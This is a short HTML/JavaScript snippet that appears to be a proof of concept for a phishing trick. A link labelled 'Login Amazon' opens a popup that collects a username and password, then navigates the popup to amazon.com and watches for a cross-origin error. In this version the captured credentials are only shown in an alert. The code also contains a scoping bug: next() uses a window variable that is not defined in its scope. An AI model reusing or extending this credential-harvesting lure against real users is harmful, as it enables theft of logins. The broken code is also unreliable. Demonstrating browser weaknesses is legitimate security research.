<script>
  function next() {
    w.location.replace('http://www.google.com/csi');
  }

 function f() {
  // open a blank window
  const w = window.open("", "new", "width=500,height=500");

  // write something inside it
w.document.write(`
  <h1>This is not Amazon!</h1>
<button onclick="
  let username = prompt('Enter your username');
  let password = prompt('Enter your password');
  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
">Click me</button>
            `);
  w.location = "http://amazon.com";

  // watch for cross-origin change (like in your original logic)
  const i = setInterval(() => {
    try {
      const x = w.location.href; // access OK
    } catch (e) {
      clearInterval(i);
      next(); // call your next() function when navigation happens
    }
  }, 100);
}

</script>

<a href="#" onclick="f()">Login Amazon</a>
